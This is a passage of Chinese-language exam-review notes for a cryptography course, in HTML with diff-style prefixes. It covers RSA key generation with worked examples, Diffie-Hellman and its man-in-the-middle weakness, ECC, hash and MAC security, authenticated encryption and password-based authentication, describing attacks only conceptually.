+<p>11^4^ = (11^2^)^2^ ≡ 4^2^ ≡ 3 mod 13</p>
+<p>11^7^ = 11x4x3 ≡132 ≡ 2 mod 13</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="rsa算法的计算" class="headerLink">
+    <a href="#rsa%e7%ae%97%e6%b3%95%e7%9a%84%e8%ae%a1%e7%ae%97" class="header-mark"></a>✨✨RSA算法的计算</h4><p>RSA体制是一种分组密码，其明文和密文均是0至某n-1之间的整数，通常n的大小为1024位二进制数或309位十进制数，也就是说n小于2^1024^。</p>
+<h5 id="rsa算法描述" class="headerLink">
+    <a href="#rsa%e7%ae%97%e6%b3%95%e6%8f%8f%e8%bf%b0" class="header-mark"></a>RSA算法描述</h5><p>RSA算法使用乘方运算，明文以分组为单位进行加密，每个分组的二进制值均小于n，也就是说，分组的大小必须小于或等于$log_2(n)+1$位，在实际应用中，分组的大小是i位，其中$2^i&lt;n\leq 2^{i+1}$。对<u>明文分组M</u>和<u>密文分组C</u>：</p>
+<p>加密：
+$$
+C=M^e \mod n
+$$
+解密：
+$$
+M=C^{d}\mod n=(M^{e})^{d}\mod n=M^{ed}\mod n
+$$
+其中收发双方均已知n，发送方已知e，只有接收方已知d，因此公钥加密算法的公钥为<code>PU={e,n}</code>，私钥为<code>PR={d,n}</code>。该算法要能对公钥加密，必须满足下列条件：</p>
+<ol>
+<li>可以找到e, d和n，是的对所有M&lt;n，有$M^{ed}=M \mod n$。</li>
+<li>对所有M&lt;n，计算$M^e$和$C^d$是比较容易的。</li>
+<li>由e和n确定d是不可行的。</li>
+</ol>
+<h5 id="生成密钥对" class="headerLink">
+    <a href="#%e7%94%9f%e6%88%90%e5%af%86%e9%92%a5%e5%af%b9" class="header-mark"></a>生成密钥对</h5><p>公钥是公钥为<code>PU={e,n}</code>，私钥为<code>PR={d,n}</code>，密钥对是<code>{e,d,n}</code>。</p>
+<p>生成密钥对的步骤：</p>
+<blockquote>
+<ol>
+<li>求n</li>
+<li>求L(L为中间过程的中间数)</li>
+<li>求e</li>
+<li>求d</li>
+</ol>
+</blockquote>
+<p>==求n==</p>
+<p>准备两个大素数p和q（典型值是1024位）</p>
+<p><code>n=pxq</code></p>
+<p>==求L==</p>
+<p>L是<code>p-1</code>和<code>q-1</code>的最小公倍数</p>
+<p><code>L=lcm(p-1,q-1)</code></p>
+<p>==求e==</p>
+<p>e满足条件：</p>
+<ol>
+<li><code>1&lt;e&lt;L</code></li>
+<li><code>gcd(e,L)=1</code></li>
+</ol>
+<p>之所以需要e和L互质是为了保证一定存在解密时需要使用的数D。</p>
+<p>现在我们已经求出了e和n也就是说我们已经生成了密钥对中的公钥了。</p>
+<p>==求d==</p>
+<p>d是由数e计算出来的，满足：</p>
+<ol>
+<li><code>1&lt;d&lt;L</code></li>
+<li><code>e*d mod L=1</code></li>
+</ol>
+<p>只要D满足上述2个条件，则通过E和N进行加密的密文就可以用D和N进行解密。</p>
+<p>简单地说条件2是为了保证密文解密后的数据就是明文。</p>
+<p>现在私钥自然也已经生成了，密钥对也就自然生成了。</p>
+<h5 id="例题" class="headerLink">
+    <a href="#%e4%be%8b%e9%a2%98" class="header-mark"></a>例题</h5><blockquote>
+<p>选两个小的质数</p>
+<p><code>p ＝ 11</code></p>
+<p><code>q ＝ 13</code></p>
+<p><code>n ＝ p ＊ q ＝ 143</code></p>
+<p><code>L ＝ lcm（p－1， q－1）＝ lcm(10，12） ＝ 60 </code></p>
+<p><code>1&lt;e&lt;L</code></p>
+<p><code>1&lt;d&lt;L</code></p>
+<p><code>gcd(e,L)=1</code></p>
+<p><code>e*d mod L=1</code></p>
+<p>取<code>e=7</code>，取<code>d=43</code></p>
+<p>得公钥<code>PU={7,143}</code>，私钥<code>PR={43,143}</code></p>
+</blockquote>
+<p>书上例子：</p>
+<blockquote>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704543723283.png" title="1704543723283" data-thumbnail="/posts/cyber_security/1704543723283.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704543723283.png"
+            srcset="/posts/cyber_security/1704543723283.png, /posts/cyber_security/1704543723283.png 1.5x, /posts/cyber_security/1704543723283.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704543723283.png" height="655"  width="1378" >
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704543742782.png" title="1704543742782" data-thumbnail="/posts/cyber_security/1704543742782.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704543742782.png"
+            srcset="/posts/cyber_security/1704543742782.png, /posts/cyber_security/1704543742782.png 1.5x, /posts/cyber_security/1704543742782.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704543742782.png" height="690"  width="1189" >
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704543770258.png" title="1704543770258" data-thumbnail="/posts/cyber_security/1704543770258.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704543770258.png"
+            srcset="/posts/cyber_security/1704543770258.png, /posts/cyber_security/1704543770258.png 1.5x, /posts/cyber_security/1704543770258.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704543770258.png" height="583"  width="1147" >
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704543776624.png" title="1704543776624" data-thumbnail="/posts/cyber_security/1704543776624.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704543776624.png"
+            srcset="/posts/cyber_security/1704543776624.png, /posts/cyber_security/1704543776624.png 1.5x, /posts/cyber_security/1704543776624.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704543776624.png" height="220"  width="1090" >
+    </a></figure></p>
+</blockquote>
+<p>PPT例子：</p>
+<blockquote>
+<p>在公钥密码算法RSA中，已知：p＝11，q＝3，任选e＝3（公钥）；密文c=4。回答以下问题：
+Φ(n)=?，n=?； 私钥d=?； 明文m＝？。
+N=p*q=33</p>
+<p>Φ(n)=(p-1)(q-1)=10*2=20</p>
+<p>E=3, ed mod Φ(n)=1, so d=7</p>
+<p>M=C^d mod n</p>
+<p>M=4 ^ 7 mod 33</p>
+</blockquote>
+<p>RSA的加解密过程</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704543820754.png" title="1704543820754" data-thumbnail="/posts/cyber_security/1704543820754.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704543820754.png"
+            srcset="/posts/cyber_security/1704543820754.png, /posts/cyber_security/1704543820754.png 1.5x, /posts/cyber_security/1704543820754.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704543820754.png" height="784"  width="985" >
+    </a></figure></p>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌针对RSA算法有哪些类型的攻击（RSA的安全性）</li>
+</ul>
+</blockquote>
+<h4 id="针对rsa的攻击" class="headerLink">
+    <a href="#%e9%92%88%e5%af%b9rsa%e7%9a%84%e6%94%bb%e5%87%bb" class="header-mark"></a>针对RSA的攻击</h4><ul>
+<li>穷举攻击：这种方法试图穷举所有可能的私钥</li>
+<li>数学攻击：有多种数学攻击方法，它们的实质都是试图分解两个素数的乘积</li>
+<li>计时攻击：这类方法依赖于解密算法的运行时间</li>
+<li>基于硬件故障的攻击：这种方法应用产生签名过程中处理器发生的故障</li>
+<li>选择密文攻击：这种攻击利用了RSA算法的性质</li>
+</ul>
+<p>RSA抗穷举攻击的方法是使用大密钥空间，所以e和d的位数越大越好，但是由于加解密含有复杂的计算，密钥越大也会导致系统运行速度变慢。</p>
+<h2 id="十密钥管理和其他公钥密码体制" class="headerLink">
+    <a href="#%e5%8d%81%e5%af%86%e9%92%a5%e7%ae%a1%e7%90%86%e5%92%8c%e5%85%b6%e4%bb%96%e5%85%ac%e9%92%a5%e5%af%86%e7%a0%81%e4%bd%93%e5%88%b6" class="header-mark"></a>十、密钥管理和其他公钥密码体制</h2><blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌DH密钥交换算法（图10.1）及针对DH算法的中间人攻击（图10.2）</li>
+</ul>
+</blockquote>
+<h3 id="dh密钥交换算法" class="headerLink">
+    <a href="#dh%e5%af%86%e9%92%a5%e4%ba%a4%e6%8d%a2%e7%ae%97%e6%b3%95" class="header-mark"></a>DH密钥交换算法</h3><p><figure><a class="lightgallery" href="/posts/cyber_security/1704544545384.png" title="1704544545384" data-thumbnail="/posts/cyber_security/1704544545384.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704544545384.png"
+            srcset="/posts/cyber_security/1704544545384.png, /posts/cyber_security/1704544545384.png 1.5x, /posts/cyber_security/1704544545384.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704544545384.png" height="679"  width="660" >
+    </a></figure></p>
+<p>DH密钥交换的安全性建立在这样的事实下：<strong>求关于素数的模素数幂运算相对容易，而计算离散对数却非常困难；对于大素数，求离散对数被认为是不可行的。</strong></p>
+<h3 id="针对dh算法的中间人攻击" class="headerLink">
+    <a href="#%e9%92%88%e5%af%b9dh%e7%ae%97%e6%b3%95%e7%9a%84%e4%b8%ad%e9%97%b4%e4%ba%ba%e6%94%bb%e5%87%bb" class="header-mark"></a>针对DH算法的中间人攻击</h3><p><figure><a class="lightgallery" href="/posts/cyber_security/1704544603526.png" title="1704544603526" data-thumbnail="/posts/cyber_security/1704544603526.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704544603526.png"
+            srcset="/posts/cyber_security/1704544603526.png, /posts/cyber_security/1704544603526.png 1.5x, /posts/cyber_security/1704544603526.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704544603526.png" height="765"  width="805" >
+    </a></figure></p>
+<p>密钥交换协议不能抵抗上述的攻击，因为它没有对通信的参与方式进行认证。这些缺陷可以通过使用<strong>数字签名和公钥证书</strong>来克服。</p>
+<h3 id="椭圆曲线密码学ecc" class="headerLink">
+    <a href="#%e6%a4%ad%e5%9c%86%e6%9b%b2%e7%ba%bf%e5%af%86%e7%a0%81%e5%ad%a6ecc" class="header-mark"></a>✨椭圆曲线密码学(ECC)</h3><p>与RSA相比，ECC的主要诱人之处在于，它可以使用比RSA短得多的密钥得到相同的安全性，因此可以减少处理负荷。</p>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌椭圆曲线密码学ECC：ECC的安全性，仅掌握结论性的内容即可</li>
+</ul>
+</blockquote>
+<ul>
+<li>ECC利用EC上的离散对数难题(ECDLP)，这和利用有限域Zp上的离散对数难题(DLP)是一样的方法。ECC中应用适用两类椭圆曲线：定义在Zp上的素曲线和在GF(2m)上构造的二元曲线。</li>
+<li>在一般数域上的离散对数问题（以及大数分解问题）存在亚指数级时间复杂度求解算法，而ECDLP只有纯指数算法（比大数分解和一般数域上的离散对数问题更难解）。</li>
+<li>应用：密钥交换、加密解密、数字签名</li>
+</ul>
+<p>==关于速度==</p>
+<ul>
+<li>速度
+<ul>
+<li><strong>在密钥长度相等的情况下，RSA和ECC的速度相当；</strong></li>
+<li><strong>但是在相同的安全强度要求下，ECC的密钥更短；</strong></li>
+</ul>
+</li>
+</ul>
+<p>故</p>
+<ul>
+<li><strong>ECC较好</strong></li>
+<li><strong>目前广泛使用</strong></li>
+</ul>
+<p>==操作==</p>
+<p>椭圆曲线的三次方程：
+$$
+y^2+axy+by=x^3+cx^2+dx+e
+$$
+可以将方程限制为下述形式：
+$$
+y^2=x^3+ax+b
+$$
+ECC太复杂了&hellip;&hellip;直接摘书：</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704545558655.png" title="1704545558655" data-thumbnail="/posts/cyber_security/1704545558655.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704545558655.png"
+            srcset="/posts/cyber_security/1704545558655.png, /posts/cyber_security/1704545558655.png 1.5x, /posts/cyber_security/1704545558655.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704545558655.png" height="520"  width="1129" >
+    </a></figure></p>
+<h2 id="十一密码学hash函数" class="headerLink">
+    <a href="#%e5%8d%81%e4%b8%80%e5%af%86%e7%a0%81%e5%ad%a6hash%e5%87%bd%e6%95%b0" class="header-mark"></a>十一、密码学hash函数</h2><p>Hash函数是一个单向的消息摘要函数，应用于<strong>消息认证和数字签名</strong></p>
+<p>==认证函数==</p>
+<pre><code>1. 对称加密
+2. 公钥加密
+3. 消息认证码（MAC）		
+4. 散列函数（Hash）
+</code></pre>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌哈希函数在消息认证、数字签名以及其他方面的应用（表11.2），参见图11.3和图11.4，ppt</li>
+</ul>
+</blockquote>
+<h3 id="散列函数的应用" class="headerLink">
+    <a href="#%e6%95%a3%e5%88%97%e5%87%bd%e6%95%b0%e7%9a%84%e5%ba%94%e7%94%a8" class="header-mark"></a>散列函数的应用</h3><p><figure><a class="lightgallery" href="/posts/cyber_security/1704546179619.png" title="1704546179619" data-thumbnail="/posts/cyber_security/1704546179619.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704546179619.png"
+            srcset="/posts/cyber_security/1704546179619.png, /posts/cyber_security/1704546179619.png 1.5x, /posts/cyber_security/1704546179619.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704546179619.png" height="844"  width="934" >
+    </a></figure></p>
+<h4 id="用于消息认证" class="headerLink">
+    <a href="#%e7%94%a8%e4%ba%8e%e6%b6%88%e6%81%af%e8%ae%a4%e8%af%81" class="header-mark"></a>用于消息认证</h4><p>散列函数用于消息认证，更一般地，使用消息认证码MAC实现消息认证</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704546254505.png" title="1704546254505" data-thumbnail="/posts/cyber_security/1704546254505.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704546254505.png"
+            srcset="/posts/cyber_security/1704546254505.png, /posts/cyber_security/1704546254505.png 1.5x, /posts/cyber_security/1704546254505.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704546254505.png" height="834"  width="1111" >
+    </a></figure></p>
+<h4 id="用于数字签名" class="headerLink">
+    <a href="#%e7%94%a8%e4%ba%8e%e6%95%b0%e5%ad%97%e7%ad%be%e5%90%8d" class="header-mark"></a>用于数字签名</h4><p><figure><a class="lightgallery" href="/posts/cyber_security/1704546298718.png" title="1704546298718" data-thumbnail="/posts/cyber_security/1704546298718.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704546298718.png"
+            srcset="/posts/cyber_security/1704546298718.png, /posts/cyber_security/1704546298718.png 1.5x, /posts/cyber_security/1704546298718.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704546298718.png" height="511"  width="1041" >
+    </a></figure></p>
+<h4 id="其他应用" class="headerLink">
+    <a href="#%e5%85%b6%e4%bb%96%e5%ba%94%e7%94%a8" class="header-mark"></a>其他应用</h4><ul>
+<li>
+<p>保护文件完整性</p>
+<p>当用户下载软件包时可以验证其内容是否合法</p>
+</li>
+<li>
+<p>口令的单向存储</p>
+<p>操作系统的口令存储使用口令的散列值：Windows和Linux下的口令存储，可以进一步扩展口令破解、彩虹表等其他内容</p>
+</li>
+</ul>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌密码学hash函数的安全性需求、穷举攻击（哈希值长m，抗原像攻击2^m^和抗第二原像攻击2^m^、碰撞攻击2^m/2^）参见表11.1和225页表（没有表名）</li>
+</ul>
+</blockquote>
+<h3 id="针对hash函数的攻击" class="headerLink">
+    <a href="#%e9%92%88%e5%af%b9hash%e5%87%bd%e6%95%b0%e7%9a%84%e6%94%bb%e5%87%bb" class="header-mark"></a>针对Hash函数的攻击</h3><ul>
+<li>
+<p>穷举攻击</p>
+<ul>
+<li>给定hash值h，试图找到满足H(y)=h 的y。对于m位的hash值，穷举规模为2m。</li>
+<li>试图找x和y，满足H(x)=H(y), 其穷举规模相对小，为2m/2。(根据生日悖论)</li>
+</ul>
+<blockquote>
+<p>抗原像攻击： 2^m^
+抗弱碰撞攻击： 2^m^
+抗强碰撞攻击： 2^m/2^</p>
+</blockquote>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704546576742.png" title="1704546576742" data-thumbnail="/posts/cyber_security/1704546576742.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704546576742.png"
+            srcset="/posts/cyber_security/1704546576742.png, /posts/cyber_security/1704546576742.png 1.5x, /posts/cyber_security/1704546576742.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704546576742.png" height="316"  width="1087" >
+    </a></figure></p>
+<h3 id="sha参数比较" class="headerLink">
+    <a href="#sha%e5%8f%82%e6%95%b0%e6%af%94%e8%be%83" class="header-mark"></a>SHA参数比较</h3><blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌安全hash算法参数： SHA参数比较，参见表11.3和表11.5（主要是消息摘要长度）</li>
+</ul>
+</blockquote>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704546788688.png" title="1704546788688" data-thumbnail="/posts/cyber_security/1704546788688.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704546788688.png"
+            srcset="/posts/cyber_security/1704546788688.png, /posts/cyber_security/1704546788688.png 1.5x, /posts/cyber_security/1704546788688.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704546788688.png" height="355"  width="1090" >
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704546847588.png" title="1704546847588" data-thumbnail="/posts/cyber_security/1704546847588.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704546847588.png"
+            srcset="/posts/cyber_security/1704546847588.png, /posts/cyber_security/1704546847588.png 1.5x, /posts/cyber_security/1704546847588.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704546847588.png" height="358"  width="1108" >
+    </a></figure></p>
+<h2 id="十二消息认证码" class="headerLink">
+    <a href="#%e5%8d%81%e4%ba%8c%e6%b6%88%e6%81%af%e8%ae%a4%e8%af%81%e7%a0%81" class="header-mark"></a>十二、消息认证码</h2><h3 id="消息认证" class="headerLink">
+    <a href="#%e6%b6%88%e6%81%af%e8%ae%a4%e8%af%81" class="header-mark"></a>消息认证</h3><blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌什么是消息认证、消息认证需求（网络环境中可能面临的攻击形式）、如何实现消息认证（即消息认证函数的类型）？</li>
+</ul>
+</blockquote>
+<h4 id="消息认证的需求" class="headerLink">
+    <a href="#%e6%b6%88%e6%81%af%e8%ae%a4%e8%af%81%e7%9a%84%e9%9c%80%e6%b1%82" class="header-mark"></a>消息认证的需求</h4><p>网络通信环境中的攻击</p>
+<ul>
+<li>消息透露给没有合法密钥的任何人或程序</li>
+<li><strong>传输分析</strong>：分析通信双方的通信模式。在面向链接的应用中，确定连接的频率和持续的时间；在面向链接或无连接的环境中，确定双方的消息数量和长度。</li>
+<li><strong>伪装</strong>：欺诈源向网络中插入一条消息。如攻击者产生一条消息并声称这条消息来自某合法实体，或者向非消息接收方发送的关于收到或未收到的消息的欺诈应答。</li>
+<li><strong>内容修改</strong>：对消息内容的修改，包括插入、删除、转换和修改</li>
+<li><strong>顺序修改</strong>：对通信双方消息顺序的修改，包括插入、删除和重新排序。</li>
+<li><strong>计时修改</strong>：对消息的延时和重播。在面向连接的应用中，整个消息序列可能是前面某项合法消息序列的重播，也可能是消息序列的=中的一条消息被延时或重播；在面向无连接的应用中，可能是一条消息（如数据报）被延时或重播。</li>
+<li><strong>发送方否认</strong>：发送方否认发送过某消息。</li>
+<li><strong>接受方否认</strong>：接收方否认接受过某消息。</li>
+</ul>
+<h4 id="实现消息认证" class="headerLink">
+    <a href="#%e5%ae%9e%e7%8e%b0%e6%b6%88%e6%81%af%e8%ae%a4%e8%af%81" class="header-mark"></a>实现消息认证</h4><ul>
+<li>Hash函数它是任意长的消息映射为定长的Hash值的函数，以该值作为验证符。</li>
+<li>消息加密：对整条消息进行加密后的密文作为认证符。</li>
+<li>消息验证吗(MAC)：它是消息和密钥的函数，它产生定长的值，以该值作为认证符。</li>
+</ul>
+<h3 id="消息认证码mac" class="headerLink">
+    <a href="#%e6%b6%88%e6%81%af%e8%ae%a4%e8%af%81%e7%a0%81mac" class="header-mark"></a>消息认证码MAC</h3><blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌什么消息认证码？消息认证码的基本用途（图12.4），消息认证码的实现方式的两种方式：基于散列函数的HMAC和基于分组密码的CMAC（实现细节不在考试范围）</li>
+</ul>
+</blockquote>
+<ul>
+<li>消息认证码：是一种认证技术，它利用密钥生成一个固定长度的短数据块(MAC)，并将该数据块附加在消息之后。（假定双方共享密钥）</li>
+<li>发送方利用密钥从明文产生一个固定长度的短数据块，和消息一起传输；</li>
+<li>接收方对收到消息用相同的密钥进行相同的计算，得出新的MAC，并与接收到的MAC比较，以判断消息是否被改动过，以及消息是否来自真正的发送方。</li>
+<li>MAC函数
+<ul>
+<li>计算明文M在密钥K的作用下的特征码
+<ul>
+<li>M || MAC(M, K)</li>
+</ul>
+</li>
+<li>验证时，判断明文M和MAC码是否一致</li>
+</ul>
+</li>
+</ul>
+<p>==讨论==</p>
+<ul>
+<li>MAC不需要可逆</li>
+<li>为了方便，MAC码通常较短</li>
+<li>实现MAC函数不排斥使用对称加密算法</li>
+<li>实现MAC函数希望使用比加密更高效的方法</li>
+<li>为防范重放攻击，加注时间、报文序号</li>
+<li>对称MAC不能提供签名特性
+<ul>
+<li>因为产生MAC的密钥为两方所有</li>
+</ul>
+</li>
+<li>基于分组密码的MAC和基于HASH的MAC</li>
+</ul>
+<h4 id="消息认证码的实现方式的两种方式" class="headerLink">
+    <a href="#%e6%b6%88%e6%81%af%e8%ae%a4%e8%af%81%e7%a0%81%e7%9a%84%e5%ae%9e%e7%8e%b0%e6%96%b9%e5%bc%8f%e7%9a%84%e4%b8%a4%e7%a7%8d%e6%96%b9%e5%bc%8f" class="header-mark"></a>消息认证码的实现方式的两种方式</h4><ul>
+<li>基于散列函数的HMAC</li>
+<li>基于分组密码的CMAC</li>
+</ul>
+<p>==MAC/HMAC的安全性==</p>
+<ul>
+<li>
+<p>攻击加密算法</p>
+<ul>
+<li>（如果有使用加密算法）</li>
+</ul>
+</li>
+<li>
+<p>攻击Hash函数</p>
+<ul>
+<li>
+<p>单向</p>
+</li>
+<li>
+<p>找碰撞报文		// Hash值大小</p>
+</li>
+<li>
+<p>生日攻击</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240107210500869.png" title="image-20240107210500869" data-thumbnail="/posts/cyber_security/image-20240107210500869.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240107210500869.png"
+            srcset="/posts/cyber_security/image-20240107210500869.png, /posts/cyber_security/image-20240107210500869.png 1.5x, /posts/cyber_security/image-20240107210500869.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240107210500869.png" height="566"  width="1276" >
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240107210448427.png" title="image-20240107210448427" data-thumbnail="/posts/cyber_security/image-20240107210448427.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240107210448427.png"
+            srcset="/posts/cyber_security/image-20240107210448427.png, /posts/cyber_security/image-20240107210448427.png 1.5x, /posts/cyber_security/image-20240107210448427.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240107210448427.png" height="425"  width="1387" >
+    </a></figure></p>
+</li>
+</ul>
+</li>
+<li>
+<p>攻击使用方法</p>
+<ul>
+<li>不正确的实现和使用方式</li>
+</ul>
+</li>
+</ul>
+<h4 id="消息认证码的基本用途图124" class="headerLink">
+    <a href="#%e6%b6%88%e6%81%af%e8%ae%a4%e8%af%81%e7%a0%81%e7%9a%84%e5%9f%ba%e6%9c%ac%e7%94%a8%e9%80%94%e5%9b%be124" class="header-mark"></a>消息认证码的基本用途(图12.4)</h4><p><figure><a class="lightgallery" href="/posts/cyber_security/1704630743429.png" title="1704630743429" data-thumbnail="/posts/cyber_security/1704630743429.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704630743429.png"
+            srcset="/posts/cyber_security/1704630743429.png, /posts/cyber_security/1704630743429.png 1.5x, /posts/cyber_security/1704630743429.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704630743429.png" height="1090"  width="1603" >
+    </a></figure></p>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌认证和加密的通用方案、认证加密CCM和GCM（知道名称即可，CCM和GCM的实现细节不在考试范围）</li>
+</ul>
+</blockquote>
+<h3 id="认证加密gcm" class="headerLink">
+    <a href="#%e8%ae%a4%e8%af%81%e5%8a%a0%e5%af%86gcm" class="header-mark"></a>认证加密GCM</h3><p>Authenticated Encryption with Associated Data (AEAD) 是一种同时具备保密性，完整性和可认证性的加密形式。</p>
+<p>早期加密算法和认证算法的组合是不安全的。</p>
+<p>2018年起，在一个算法在内部<strong>同时实现加密和认证</strong></p>
+<p><code>AES-128-GCM</code></p>
+<p>``AES-192-GCM`</p>
+<p><code>AES-256-GCM</code></p>
+<p><code>ChaCha20-IETF-Poly1305（流密码，移动设备多用）</code></p>
+<p>``XChaCha20-IETF-Poly1305`</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240107210628682.png" title="image-20240107210628682" data-thumbnail="/posts/cyber_security/image-20240107210628682.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240107210628682.png"
+            srcset="/posts/cyber_security/image-20240107210628682.png, /posts/cyber_security/image-20240107210628682.png 1.5x, /posts/cyber_security/image-20240107210628682.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240107210628682.png" height="355"  width="1370" >
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240107210648276.png" title="image-20240107210648276" data-thumbnail="/posts/cyber_security/image-20240107210648276.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240107210648276.png"
+            srcset="/posts/cyber_security/image-20240107210648276.png, /posts/cyber_security/image-20240107210648276.png 1.5x, /posts/cyber_security/image-20240107210648276.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240107210648276.png" height="394"  width="1346" >
+    </a></figure></p>
+<h2 id="十三数字签名技术" class="headerLink">
+    <a href="#%e5%8d%81%e4%b8%89%e6%95%b0%e5%ad%97%e7%ad%be%e5%90%8d%e6%8a%80%e6%9c%af" class="header-mark"></a>十三、数字签名技术</h2><ol start="28">
+<li>什么是数字签名？数字签名特征、需求，常见的数字签名算法DSA（算法实现不在考试范围）、使用RSA私钥如何实现数字签名? （图11.4 数字签名简要示例）</li>
+<li>消息认证码和数字签名有什么区别？（见消息认证码和数字签名作业）</li>
+</ol>
+<h2 id="十四轻量级密码和后量子密码" class="headerLink">
+    <a href="#%e5%8d%81%e5%9b%9b%e8%bd%bb%e9%87%8f%e7%ba%a7%e5%af%86%e7%a0%81%e5%92%8c%e5%90%8e%e9%87%8f%e5%ad%90%e5%af%86%e7%a0%81" class="header-mark"></a>十四、轻量级密码和后量子密码</h2><h2 id="十五密钥管理与分发" class="headerLink">
+    <a href="#%e5%8d%81%e4%ba%94%e5%af%86%e9%92%a5%e7%ae%a1%e7%90%86%e4%b8%8e%e5%88%86%e5%8f%91" class="header-mark"></a>十五、密钥管理与分发</h2><ol start="30">
+<li>对称密钥分发：基于对称加密的对称密钥分发（图15.1两个通信实体之间的密钥分发）、基于非对称加密的对称密钥分发（图15.4中间人攻击、图15.5利用公钥分发密钥）</li>
+<li>公钥分发：公钥证书（图15.9公钥证书的交换、图15.10 X.509公钥证书的应用）、X.509证书、公钥基础设施PKI包括哪些关键元素及其作用P322页</li>
+</ol>
+<h2 id="十六用户认证" class="headerLink">
+    <a href="#%e5%8d%81%e5%85%ad%e7%94%a8%e6%88%b7%e8%ae%a4%e8%af%81" class="header-mark"></a>十六、用户认证</h2><blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌什么是身份认证？认证方式有哪些？</li>
+</ul>
+</blockquote>
+<p>认证身份的四个常用工具</p>
+<ul>
+<li>知道什么：口令、pin码或者之前准备问题的答案</li>
+</ul>
+<ul>
+<li>拥有什么：加密密钥、电子密钥卡、智能卡或物理密钥，这种类型的认证信息称为令牌</li>
+</ul>
+<ul>
+<li>静态生物特征：如指纹、视网膜和脸</li>
+</ul>
+<ul>
+<li>动态生物特征：如声音模式、手写特征和打字节奏</li>
+</ul>
+<p>==基于口令的认证方式==</p>
+<p>一般过程：</p>
+<ol>
+<li>
+<p>初始化：用户选择口令、口令的散列值存储在口令文件中</p>
+</li>
+<li>
+<p>身份认证阶段：用户登录系统、提供口令、系统计算散列值，并进行比较</p>
+</li>
+</ol>
+<p>基于口令的认证—弱认证方式</p>
+<p>口令在相当长的时间内固定</p>
+<p>明文存放或哈希后存放</p>
+<p>通过设置规则（如字母、数字、长度等），避免设置弱口令</p>
+<p>Salt（盐值）提高字典攻击的穷举空间</p>
+<p>==针对口令的攻击==</p>
+<ul>
+<li>重放攻击（因口令一般一段时间内固定）</li>
+<li>穷举攻击
+<ul>
+<li>8个字符相当于40-50bits的穷举空间</li>
+</ul>
+</li>
+<li>字典攻击
+<ul>
+<li>在线字典攻击</li>
+<li>离线字典攻击
+<ul>
+<li>建立离线字典文件：口令列表、与攻击目标系统采用同样的hash算法，计算生成的口令hash值</li>
+<li>获取passwd文件：passwd文件里的hash值与字典文件中的hash进行比对</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<ul>
